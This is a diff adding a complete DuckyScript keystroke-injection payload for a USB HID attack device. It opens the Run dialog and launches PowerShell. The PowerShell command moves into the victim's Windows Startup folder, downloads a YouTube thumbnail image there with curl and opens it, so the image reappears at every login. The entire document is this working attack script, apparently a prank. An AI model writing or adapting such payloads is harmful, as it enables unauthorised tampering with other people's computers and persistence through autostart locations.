@@ -1,0 +1,8 @@
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 1000
+STRING powershell.exe "cd \"c:/users/$env:username/appdata/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\";curl http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg -o i.jpg;start .\\i.jpg;exit"
+ENTER
+GUI d
